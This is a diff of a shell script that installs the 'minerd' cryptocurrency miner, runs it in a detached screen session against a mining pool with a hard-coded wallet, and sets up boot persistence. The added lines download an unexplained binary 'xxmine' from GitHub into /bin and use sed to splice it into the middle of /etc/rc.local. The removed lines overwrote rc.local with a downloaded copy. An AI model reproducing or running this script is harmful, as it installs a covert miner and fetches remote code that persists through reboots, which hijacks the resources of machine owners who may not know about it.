@@ -11,8 +11,7 @@ make
 mv minerd /usr/local/bin/
 cd
 screen -dmS ZPOOL minerd -a yescrypt -o stratum+tcp://mine.zpool.ca:6233 -u 15xtsu8mXijRKhiL8DWt5GuRwqKJJm5pRH -p Miner
-cd /etc
-rm -r rc.local
-rm rc.local
-wget https://raw.githubusercontent.com/QualityNet/arquivos/master/rc.local
-chmod +x rc.local
+cd /bin
+wget https://raw.githubusercontent.com/QualityNet/arquivos/master/xxmine
+chmod +x /bin/xxmine
+sed -i "$(($(cat /etc/rc.local | wc -l)/2)) a xxmine" /etc/rc.local
